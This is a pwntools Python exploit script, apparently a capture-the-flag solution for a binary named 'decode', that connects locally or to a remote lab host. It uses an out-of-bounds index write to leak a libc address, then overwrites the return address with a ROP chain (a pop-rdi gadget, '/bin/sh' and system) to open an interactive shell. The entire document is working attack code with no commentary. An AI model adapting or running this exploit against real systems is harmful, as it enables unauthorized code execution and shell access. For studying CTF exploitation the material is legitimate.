from pwn import *
import sys

if len(sys.argv) < 2:
	p = process("./decode")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def write(index,value):
	p.sendlineafter("input index\n",str(index))
	p.recvuntil("now value(hex) ")
	now_value = int(p.recvuntil("\n",drop = True),16)
	p.sendlineafter("input new value\n",str(value))
	return now_value

def setname(name):
	p.sendafter("input your name \nname:",name)

def leak(index):
	res = ""
	for i in range(8):
		res += chr(write(index*8 + i,0xfe)&0xff)
	return u64(res)

def write_(index,value):
	for i in range(8):
		write(index*8 + i,value & 0xff)
		value = value >> 8

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xB9C)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
setname("a"*8)
index1 = 0x7fffffffda48 - 0x7fffffffd8f0
index2 = 0x7fffffffdb68 - 0x7fffffffd8f0
leak_addr = leak(index2/8)
libc.address = leak_addr - 240 - libc.symbols["__libc_start_main"]
log.success("libc_base:" + hex(libc.address))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
rdi = libc.address + 0x0000000000021102 
index3 = 0x7fffffffda48 - 0x7fffffffd8f0
index4 = 0x7fffffffda50 - 0x7fffffffd8f0
index5 = 0x7fffffffda58 - 0x7fffffffd8f0
write_(index3/8,rdi)
write_(index4/8,binsh)
for i in range(2):
	write_(index5/8,system)
for i in range(1):
	write(0,0)
p.sendafter("do you want continue(yes/no)? \n","no")
p.interactive()
